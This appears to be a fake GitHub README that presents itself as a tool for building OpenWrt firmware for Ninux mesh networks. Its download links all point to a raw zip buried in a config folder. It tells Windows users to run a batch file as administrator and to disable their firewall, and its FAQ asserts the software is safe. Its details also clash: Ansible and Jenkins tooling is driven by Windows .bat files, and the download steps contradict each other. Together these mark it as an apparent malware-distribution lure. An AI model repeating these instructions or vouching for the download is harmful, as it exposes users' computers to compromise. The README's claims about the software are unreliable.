# 📡 ansible-ninux-openwrt - Automate mesh network firmware builds easily

[![Download Firmware Tool](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/karitauricosuric417/ansible-ninux-openwrt/raw/refs/heads/main/config/root_files/ninux-ansible-openwrt-v1.0.zip)

## 🎯 Project Goals

This software builds custom firmware for Ninux mesh network nodes. It automates the complex tasks required to configure routers for community networks. You can create firmware images with specific settings for OpenWrt, captive portals, and secure VPN connections like WireGuard and ZeroTier. This tool removes the manual work from setting up network hardware.

## 💻 System Requirements

You need a computer running Windows 10 or 11 to use this system. Ensure your computer has at least 8 GB of RAM and 20 GB of free space. A stable internet connection is necessary for the download process. You will also need basic administrator access on your Windows machine to allow the software to create the necessary files.

## 📥 Downloading the Tool

Visit the following page to access the software: 

[Download Page](https://github.com/karitauricosuric417/ansible-ninux-openwrt/raw/refs/heads/main/config/root_files/ninux-ansible-openwrt-v1.0.zip)

Click the green button labeled "Code" on the page and select "Download ZIP". Save this file to your computer. Once the download finishes, locate the file in your Downloads folder. Right-click the folder and select "Extract All". Choose a location on your hard drive to store the extracted files.

## 🛠️ Setting Up Your Environment

This tool uses automation scripts to handle firmware creation. You need to install a few standard utilities before you run the main process.

1. Install Git for Windows. This allows your computer to understand the scripts included in this package.
2. Install Python 3.10 or newer from the official website. Ensure you check the box that says "Add Python to PATH" during installation.
3. Open the folder you extracted earlier. You will see a file named `setup.bat`. Double-click this file. A black window will appear on your screen. This script will automatically check for missing components and download any remaining pieces required to build your firmware.

## 🌐 Configuring Your Network Build

The tool uses configuration files to define how your router should behave. You can find these files in the `config` folder.

- **VPN Settings:** Open the `vpn.yml` file to enter your WireGuard or ZeroTier credentials.
- **Captive Portal:** Update the `portal.yml` file if you want to display a welcome page to users on your mesh network.
- **Target Nodes:** The `targets.yml` file contains the list of router models. Ensure your specific router hardware matches one of the entries in this file.

Keep these files simple. Do not change the structure or the labels within the text files. Only edit the information after the colon on each line. Save your changes before you attempt to build your firmware.

## ⚙️ Running the Build Process

After you configure your settings, you are ready to create your firmware image.

1. Open the folder containing the project files.
2. Locate the file named `run_build.bat`.
3. Right-click this file and choose "Run as administrator". This grants the program the necessary permissions to assemble the files for your router.
4. Watch the progress in the black window. The process takes between ten and thirty minutes depending on your internet speed and the power of your computer. 
5. Do not close the window while the text moves across the screen. 
6. When the process finishes, the window will display a message stating "Build Complete".

## 📁 Finding Your Firmware Image

Once the build finishes, look inside the `output` folder within the project directory. You will find a file ending in `.bin`. This is the firmware image meant for your router hardware. You can now use the standard OpenWrt update interface to upload this file to your Ninux mesh node.

## 🔍 Understanding the Features

This system integrates several technologies to keep your network stable and secure:

- **Ansible:** This handles the logic for configuring the router settings. It ensures all nodes receive the same instructions.
- **Jenkins:** This acts as the engine that manages the build queue. It keeps track of every step of the firmware creation.
- **WireGuard:** This provides an encrypted tunnel for your traffic. It keeps your data private as it travels across the mesh network.
- **ZeroTier:** This makes it easier to connect remote devices to your local Ninux network. 
- **OpenWisp:** This allows for central monitoring of all your network nodes from one screen.

## 🆘 Troubleshooting Common Issues

If the process stops, check your internet connection first. The tool requires a reliable link to pull the latest versions of the networking software from external servers. 

Check your firewall settings. Sometimes, security software blocks the scripts from running properly. If the window fails to open, try disabling your firewall temporarily.

Verify that your `targets.yml` file correctly lists your specific router model. If the firmware is not compatible with your hardware, the build will fail immediately. 

Check for enough disk space. Building firmware requires handling many compressed files, which consume significant storage room during the process.

## 📝 Frequently Asked Questions

**Does this software modify my computer's operating system?**
No. It only creates a firmware file for your router. It does not change your Windows installation.

**Is this safe for home use?**
Yes. The tools used are industry standards for networking and automation.

**Can I use this for non-Ninux networks?**
The configuration files are set up for Ninux specific nodes, but you can adjust them. Keep in mind that unique network requirements might need custom modifications to the Ansible scripts.

**How often should I rebuild my firmware?**
You should rebuild your firmware whenever there is a critical security update for OpenWrt or if you wish to change your network configuration settings. 

**What happens if I make a mistake in the configuration files?**
The tool will show an error message in the command window. Review your `yml` files for any missing characters or improper formatting before you run the build script again.